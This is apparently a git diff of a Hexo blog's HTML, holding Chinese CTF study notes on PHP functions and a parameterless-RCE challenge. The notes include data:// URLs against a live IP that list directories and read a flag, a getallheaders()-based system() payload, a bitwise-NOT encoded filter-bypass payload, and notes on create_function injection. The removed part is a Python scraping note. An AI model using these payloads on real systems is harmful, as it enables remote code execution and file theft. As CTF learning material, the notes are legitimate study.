+</thead>
+<tbody><tr>
+<td><em>directory</em></td>
+<td>必需。规定新的当前目录。</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="http://39.107.126.173:28537/?a=data:text/plain,var_dump(scandir(%E2%80%98.%E2%80%99));%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89">http://39.107.126.173:28537/?a=data:text/plain,var_dump(scandir(‘.’)); </a></p>
+<h5 id="chdir-‘-’"><a href="#chdir-‘-’" class="headerlink" title="chdir(‘.’)"></a>chdir(‘.’)</h5><p>如果没有返回上一层目录</p>
+<p> <a target="_blank" rel="noopener" href="http://39.107.126.173:28537/?a=data:text/plain,var_dump(scandir(%E2%80%98.%E2%80%99));">http://39.107.126.173:28537/?a=data:text/plain,var_dump(chdir(‘.’));var_dump(scandir(‘.’));</a> </p>
+<h5 id="chdir"><a href="#chdir" class="headerlink" title="chdir(../../../)"></a>chdir(../../../)</h5><p>继续</p>
+<p><a target="_blank" rel="noopener" href="http://39.107.126.173:28537/?a=data:text/plain,var_dump(scandir(%E2%80%98.%E2%80%99));">http://39.107.126.173:28537/?a=data:text/plain,var_dump(chdir(‘../../../‘));var_dump(scandir(‘.’));</a> </p>
+<p>如果出现flag，进行读取</p>
+<p><a target="_blank" rel="noopener" href="http://39.107.126.173:28537/?a=data:text/plain,var_dump(chdir(&#39;../../../&#39;));var_dump(scandir(%E2%80%98.%E2%80%99));var_dump(readfile(flag)">http://39.107.126.173:28537/?a=data:text/plain,var_dump(chdir(&#39;../../../&#39;));var_dump(scandir(‘.’));var_dump(readfile(flag)</a>);</p>
+<h4 id="•chr"><a href="#•chr" class="headerlink" title="•chr()"></a>•chr()</h4><p>*该函数用于将ASCII码值转化为字符串</p>
+<h4 id="•ord"><a href="#•ord" class="headerlink" title="•ord()"></a>•ord()</h4><p>*该函数用于将字符串转化为ASCII码值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str1&#x3D;chr(88); </span><br><span class="line">echo $str1;</span><br><span class="line">echo &quot;\t&quot;; </span><br><span class="line">$str2&#x3D;ord(&#39;S&#39;); </span><br><span class="line">echo $str2;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223000853829.png"></p>
+<h4 id="•getcwd"><a href="#•getcwd" class="headerlink" title="•getcwd()"></a>•getcwd()</h4><p>*函数返回当前工作目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo getcwd()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223001214698.png"></p>
+<h4 id="•localtime"><a href="#•localtime" class="headerlink" title="•localtime()"></a>•localtime()</h4><p>*以一个数值数组和一个关联数组的形式输出本地时间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(localtime());</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">print_r(localtime(time(),true));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; 38</span><br><span class="line">    [1] &#x3D;&gt; 13</span><br><span class="line">    [2] &#x3D;&gt; 16</span><br><span class="line">    [3] &#x3D;&gt; 22</span><br><span class="line">    [4] &#x3D;&gt; 11</span><br><span class="line">    [5] &#x3D;&gt; 120</span><br><span class="line">    [6] &#x3D;&gt; 2</span><br><span class="line">    [7] &#x3D;&gt; 356</span><br><span class="line">    [8] &#x3D;&gt; 0</span><br><span class="line">)</span><br><span class="line">&lt;br&gt;&lt;br&gt;Array</span><br><span class="line">(</span><br><span class="line">    [tm_sec] &#x3D;&gt; 38</span><br><span class="line">    [tm_min] &#x3D;&gt; 13</span><br><span class="line">    [tm_hour] &#x3D;&gt; 16</span><br><span class="line">    [tm_mday] &#x3D;&gt; 22</span><br><span class="line">    [tm_mon] &#x3D;&gt; 11</span><br><span class="line">    [tm_year] &#x3D;&gt; 120</span><br><span class="line">    [tm_wday] &#x3D;&gt; 2</span><br><span class="line">    [tm_yday] &#x3D;&gt; 356</span><br><span class="line">    [tm_isdst] &#x3D;&gt; 0</span><br><span class="line">)</span><br><span class="line">[Finished in 0.2s]</span><br></pre></td></tr></table></figure>
+
+<h4 id="•localeconv-1"><a href="#•localeconv-1" class="headerlink" title="•localeconv()"></a>•localeconv()</h4><p>*localeconv()函数返回一个包含本地数字及货币格式信息的数组</p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223001634117.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">array(18) &#123;</span><br><span class="line">  [&quot;decimal_point&quot;]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [&quot;thousands_sep&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;int_curr_symbol&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;currency_symbol&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;mon_decimal_point&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;mon_thousands_sep&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;positive_sign&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;negative_sign&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;int_frac_digits&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;frac_digits&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_cs_precedes&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_sep_by_space&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_cs_precedes&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_sep_by_space&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_sign_posn&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_sign_posn&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;grouping&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;mon_grouping&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">[Finished in 0.2s]</span><br></pre></td></tr></table></figure>
+
+<h4 id="•dirname"><a href="#•dirname" class="headerlink" title="•dirname()"></a>•dirname()</h4><p>*返回路径中的目录部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo dirname(&quot;D:\phpStudy\PHPTutorial\WWW&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223141210413.png"></p>
+<h4 id="•array-rand"><a href="#•array-rand" class="headerlink" title="•array_rand()"></a>•array_rand()</h4><p>*函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组</p>
+<p>*语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_rand(array,number)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>array</em></td>
+<td>必需。规定数组。</td>
+</tr>
+<tr>
+<td><em>number</em></td>
+<td>可选。规定返回多少个随机的元素。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;array(&quot;a&quot;&#x3D;&gt;&quot;red&quot;,&quot;b&quot;&#x3D;&gt;&quot;green&quot;,&quot;c&quot;&#x3D;&gt;&quot;blue&quot;,&quot;d&quot;&#x3D;&gt;&quot;yellow&quot;);</span><br><span class="line">print_r(array_rand($a,2));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223141648065.png"></p>
+<h4 id="•hex2bin"><a href="#•hex2bin" class="headerlink" title="•hex2bin()"></a>•hex2bin()</h4><p>*把十六进制值转换为 ASCII 字符</p>
+<p>*语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex2bin(string)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>string</em></td>
+<td>必需。要转换的十六进制值。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo hex2bin(&quot;48656c6c6f20576f726c6421&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223141929932.png"></p>
+<h4 id="•readfile"><a href="#•readfile" class="headerlink" title="•readfile()"></a>•readfile()</h4><p>*读取一个文件，并写入到输出缓冲</p>
+<p>*语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(filename,include_path,context)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>filename</td>
+<td>必需。规定要读取的文件。</td>
+</tr>
+<tr>
+<td>include_path</td>
+<td>可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。</td>
+</tr>
+<tr>
+<td>context</td>
+<td>可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo readfile(&quot;3.php&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223142353720.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://ggken753.github.io/2020/12/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010/" data-id="ckiqyhpbo0000uov34e9tbmk3" class="article-share-link">Share</a>
+      <a data-url="http://ggken753.github.io/2020/12/23/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011/" data-id="ckj176h8500005gv30klo3lo6" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-学习笔记10" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/12/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010/" class="article-date">
+  <time datetime="2020-12-17T16:00:00.000Z" itemprop="datePublished">2020-12-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010/">实战</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Your-Guojingming"><a href="#Your-Guojingming" class="headerlink" title="Your Guojingming"></a>Your Guojingming</h3><p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201218171524302.png"></p>
+<p>#是一道无参数RCE ，因此code只能是函数形式</p>
+<p>#利用<code>getallheaders()</code>来获取参数RCE</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders()))); </span><br></pre></td></tr></table></figure>
+
+<p>#查看没有过滤掉的字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($a&#x3D; 0; $a&lt; 256; $a++) &#123;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;[A-Za-z0-9]|\&#39;|&quot;|&#96;|\ |,|\.|-|\+|&#x3D;|\&#x2F;|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|&#x2F;is&#39;, chr($a))) &#123;</span><br><span class="line">        echo (chr($a));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201218171655226.png"></p>
+<p>根据师兄提醒的[‘phpinfo’][false] 可以构建一个字符串 “phpinfo”</p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201218173436424.png"></p>
+<p>#因为字母都被过滤掉了，得使用取反绕过，用urlencode编码构造一个phpinfo();</p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201215135456955.png"></p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201215143317291.png"></p>
+<p>#所以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders()))); 也需要进行编码</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201215145933621.png"></p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201215150021504.png"></p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201215150046880.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;[~%8F%8D%96%91%8B%A0%8D][!%FF]([~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201215151550554.png"></p>
+<h3 id="CRETE-FUNCTION函数"><a href="#CRETE-FUNCTION函数" class="headerlink" title="CRETE_FUNCTION函数"></a>CRETE_FUNCTION函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create_function(string $args,string $code)</span><br><span class="line">string $args 声明的函数变量部分</span><br><span class="line">string $code 执行的方法代码部分</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function()这个函数的漏洞，他create之后会自动生成一个函数名为%00lambda_%d</span><br></pre></td></tr></table></figure>
+
+<p><code>create_function()</code>会创建一个匿名函数（<code>lambda</code>样式）。此处创建了一个叫<code>lambda_1</code>的函数，在第一个<code>echo</code>中显示出名字，并在第二个<code>echo</code>语句中执行了此函数。</p>
+<p>create_function()函数会在内部执行 eval()，我们发现是执行了后面的<code>return</code>语句，属于<code>create_function()</code>中的第二个参数<code>string $code</code>位置。</p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201219165245667.png"></p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201217141023196.png"></p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201219165449901.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://ggken753.github.io/2020/12/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010/" data-id="ckiqyhpbo0000uov34e9tbmk3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1267,73 +1604,6 @@
 
 
   
-    <article id="post-学习笔记2" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/28/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/" class="article-date">
-  <time datetime="2020-10-28T14:24:28.000Z" itemprop="datePublished">2020-10-28</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/28/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/">python爬虫笔记(二)</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>. （ggken原创）</p>
-<p>一． 得到一个指定的url的网页内容</p>
-<p>（1）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def askURL(url)</span><br><span class="line">  head&#x3D;&#123;    </span><br><span class="line">“User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko&#x2F;20100101 Firefox&#x2F;81.0”</span><br><span class="line">request &#x3D;urllib.request.Request (url,headers&#x3D;head)</span><br><span class="line">html&#x3D;’”</span><br><span class="line">try :  </span><br><span class="line">Response &#x3D;urllib.request.urlopen(request)</span><br><span class="line">html &#x3D;response.read().decode(“utf-8”)</span><br><span class="line">print(“html”)</span><br><span class="line">except:urllib.error.URLError as e:</span><br><span class="line">If hasattr(e,”code”):</span><br><span class="line">print(e.code)</span><br><span class="line">If hasattr(e,”reason”):</span><br><span class="line">print(e.reason)</span><br></pre></td></tr></table></figure>
-
-<p>head :#模拟浏览器信息，向服务器发送消息</p>
-<p>User-Agent:#用户代理，表示告诉服务器，我们是什么类型的机器、浏览器（本质上是告诉浏览器，我们是可以接受什么水平的文件内容</p>
-<p>if hasattr（） :如果出错，显示出错的字符以及错误的原因</p>
-<p>（2）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># -*- codeing &#x3D; utf-8 -*-</span><br><span class="line"># @Time : 2020&#x2F;10&#x2F;14 22:08</span><br><span class="line"># @Author : ggken</span><br><span class="line"># @File : 爬虫.py</span><br><span class="line"># @Software : PyCharm</span><br><span class="line">#import bs4   #网页解析，获取数据</span><br><span class="line">import xlwt    #进行excel操作</span><br><span class="line">import re    #正则表达式，进行文字匹配</span><br><span class="line">import urllib.request,urllib.error   #制定URL，获取网页数据</span><br><span class="line">import sqlite3  #进行sqlite数据库操作</span><br><span class="line">from bs4 import BeautifulSoup   #引入模块</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    baseurl &#x3D;&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;&quot;</span><br><span class="line">    datalist&#x3D;getData(baseurl)</span><br><span class="line">    savepath &#x3D;&quot;.\\豆瓣250.xls&quot;</span><br><span class="line">    #saveData(savepath)</span><br><span class="line"></span><br><span class="line">    askURL(&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;0&quot;)</span><br><span class="line">#爬取网页</span><br><span class="line">def getData(baseurl):</span><br><span class="line">    datalist&#x3D;[]</span><br><span class="line">    for i in range(0, 10):    #调用获取页面信息的函数 10次</span><br><span class="line">        url &#x3D; baseurl + str(i * 25)</span><br><span class="line">        html &#x3D; askURL(url)  #保存获取到的网页源码</span><br><span class="line"></span><br><span class="line">    return  datalist</span><br><span class="line"></span><br><span class="line">#得到指定一个url的网页内容</span><br><span class="line">def askURL(url):</span><br><span class="line"></span><br><span class="line">   head &#x3D;&#123;      #模拟浏览器头部信息，向豆瓣服务器发送信息</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko&#x2F;20100101 Firefox&#x2F;82.0&quot;&#125;</span><br><span class="line">     #用户代理，表示告诉豆瓣服务器，我们是什么类型的机器，浏览器（本质上是告诉浏览器我们可以接受什么水平的文件内容）</span><br><span class="line">   request &#x3D; urllib.request.Request(url,headers&#x3D;head)</span><br><span class="line">   html &#x3D; &quot;&quot;</span><br><span class="line">   try:</span><br><span class="line">       response &#x3D; urllib.request.urlopen(request)</span><br><span class="line">       html &#x3D; response.read().decode(&quot;utf-8&quot;)</span><br><span class="line">       print(html)</span><br><span class="line">   except urllib.error.URLError as e:</span><br><span class="line">       if hasattr(e,&quot;code&quot;):</span><br><span class="line">           print(e.code)</span><br><span class="line">       if hasattr(e,&quot;reason&quot;):</span><br><span class="line">           print(e.reason)</span><br><span class="line">   return html</span><br><span class="line">#保存数据</span><br><span class="line">def saveData(savepath):</span><br><span class="line">   print(&quot;save...&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:   #当程序执行时</span><br><span class="line">#调用函数</span><br><span class="line">     main()</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/9952000382b98300b6d65541c54a709.png"></p>
-<p>（3）使用 bs4 中的beautifulsoup</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"># -*- codeing &#x3D; utf-8 -*-</span><br><span class="line"># @Time : 2020&#x2F;10&#x2F;27 16:58</span><br><span class="line"># @Author : ggken</span><br><span class="line"># @File : testBS4.py</span><br><span class="line"># @Software : PyCharm</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">file&#x3D; open(&quot;网页&quot;,&quot;rb&quot;)</span><br><span class="line">html &#x3D;file.read()</span><br><span class="line">bs &#x3D; BeautifulSoup(网页类型,&quot;编译器&quot;)</span><br><span class="line">1. Tag 标签及其内容</span><br><span class="line">print(bs.想要的数据：例如&lt;title&gt;等标签)   打印出的是标签和内容</span><br><span class="line">print(bs.想要的数据：例如&lt;title&gt;等标签.string)  打印出的是标签里面的内容</span><br><span class="line">2.NavigableString</span><br><span class="line">print(bs.想要的数据：例如&lt;title&gt;等标签.attrs )  打印出的是标签里面所有的属性</span><br><span class="line">3. BeautifulSoup  表示整个文档</span><br><span class="line">print(bs.name)    打印出文档名字</span><br><span class="line">print(bs)     打印出整个文档内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#文档的遍历</span><br><span class="line">print(bs.head.contents)  打印出head里面的内容</span><br><span class="line">print(bs.head.contents[1])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#文档的搜索</span><br><span class="line">#(1)find_all</span><br><span class="line">#字符串过滤：会查找与字符串完全匹配的内容</span><br><span class="line">t_list &#x3D; bs.find_all(&quot;a&quot;)</span><br><span class="line">print(t_list)   查找所有a标签</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">#正则表达式搜收：使用search()方法来匹配内容</span><br><span class="line">t_list&#x3D;bs.find_all(re.compile(&quot;a&quot;))</span><br><span class="line">print(t_list)</span><br><span class="line">打印含有a的内容</span><br><span class="line"></span><br><span class="line">#方法：传入一个函数方法，根据函数的要求来搜索</span><br><span class="line">def name_is_exists(tag):</span><br><span class="line">    return tag.has_attr(&quot;name&quot;)</span><br><span class="line">t_list &#x3D; 